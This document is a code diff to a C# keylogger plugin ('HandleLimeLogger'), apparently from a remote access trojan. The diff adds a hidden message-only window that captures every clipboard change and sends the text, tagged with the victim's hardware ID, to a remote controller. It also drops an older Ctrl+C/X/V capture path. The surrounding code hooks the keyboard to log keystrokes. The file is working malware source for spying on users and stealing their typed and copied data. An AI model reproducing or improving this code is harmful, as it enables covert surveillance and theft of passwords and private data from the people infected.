@@ -1,4 +1,4 @@
-﻿using Plugin.MessagePack;
+﻿using MessagePackLib.MessagePack;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -36,6 +36,58 @@ namespace Plugin
         }
     }
 
+
+    public class ClipboardNotification : Form
+    {
+        public ClipboardNotification()
+        {
+            SetParent(Handle, HWND_MESSAGE);
+            AddClipboardFormatListener(Handle);
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            if (m.Msg == WM_CLIPBOARDUPDATE)
+            {
+                Debug.WriteLine($"Clipboard {Clipboard.GetCurrentText()}");
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "keyLogger";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("log").AsString = $"\n###  Clipboard ###\n{Clipboard.GetCurrentText()}\n";
+                Connection.Send(msgpack.Encode2Bytes());
+            }
+            base.WndProc(ref m);
+        }
+
+        private const int WM_CLIPBOARDUPDATE = 0x031D;
+        private static IntPtr HWND_MESSAGE = new IntPtr(-3);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+    }
+
+    internal static class Clipboard
+    {
+        public static string GetCurrentText()
+        {
+            string ReturnValue = string.Empty;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+    }
+
     public static class HandleLimeLogger
     {
         public static bool isON = false;
@@ -57,7 +109,7 @@ namespace Plugin
                 GC.Collect();
                 Application.Exit();
             }).Start();
-            Application.Run();
+            Application.Run(new ClipboardNotification());
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -88,7 +140,6 @@ namespace Plugin
                     int vkCode = Marshal.ReadInt32(lParam);
                     bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
                     bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
-                    bool ctrlPressed = (GetKeyState(0xA2) & 0x8000) != 0 || (GetKeyState(0xA3) & 0x8000) != 0;
                     string currentKey = KeyboardLayout((uint)vkCode);
 
                     if (capsLockPressed || shiftPressed)
@@ -100,15 +151,7 @@ namespace Plugin
                         currentKey = currentKey.ToLower();
                     }
 
-                    if (ctrlPressed)
-                    {
-                        if (((Keys)vkCode == Keys.X) || ((Keys)vkCode == Keys.C) || ((Keys)vkCode == Keys.V))
-                        {
-                            ClipboardGetText(((Keys)vkCode).ToString());
-                            currentKey = string.Empty;
-                        }
-                    }
-                    else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                         currentKey = "[" + (Keys)vkCode + "]";
                     else
                     {
@@ -160,27 +203,6 @@ namespace Plugin
             {
                 return IntPtr.Zero;
             }
-        }
-
-        private static void ClipboardGetText(string key)
-        {
-            Thread STAThread = new Thread(
-                delegate ()
-                {
-                    if (Clipboard.ContainsText())
-                    {
-                        Thread.Sleep(500);
-                        string ReturnValue = string.Empty;
-                        ReturnValue = Clipboard.GetText();
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                        msgpack.ForcePathObject("log").AsString = $"\n[CTRL+{key}]:{ReturnValue}\n";
-                        Connection.Send(msgpack.Encode2Bytes());
-                    }
-                });
-            STAThread.SetApartmentState(ApartmentState.STA);
-            STAThread.Start();
         }
 
         private static string KeyboardLayout(uint vkCode)
